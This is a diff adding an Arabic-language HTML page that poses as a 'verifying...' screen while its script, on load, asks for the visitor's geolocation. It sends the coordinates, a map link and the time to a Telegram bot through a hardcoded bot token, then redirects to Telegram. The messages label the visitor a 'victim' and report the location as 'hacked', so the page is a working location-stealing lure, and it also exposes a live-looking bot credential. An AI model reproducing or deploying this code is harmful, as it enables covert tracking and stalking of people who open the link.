@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    </style>
+</head>
+<body>
+    <div id="status">جاري التحقق...</div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id');
+        const linkId = urlParams.get('link_id');
+        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
+        
+        async function sendMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: userId, text: text })
+                });
+            } catch(e) {}
+        }
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    await sendMessage(`📍 تم اختراق الموقع!\nالموقع: ${lat}, ${lon}\nالخريطة: https://maps.google.com/?q=${lat},${lon}\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
+                    document.getElementById('status').innerHTML = '✅ تم';
+                    setTimeout(() => { window.location.href = "https://t.me"; }, 1500);
+                }, async (error) => {
+                    await sendMessage(`❌ فشل اختراق الموقع!\nالضحية رفض المشاركة\nالوقت: ${new Date().toLocaleString()}`);
+                    document.getElementById('status').innerHTML = '❌ فشل';
+                    setTimeout(() => { window.location.href = "https://t.me"; }, 2000);
+                });
+            } else {
+                document.getElementById('status').innerHTML = '❌ غير مدعوم';
+            }
+        }
+        
+        getLocation();
+    </script>
+</body>
+</html>
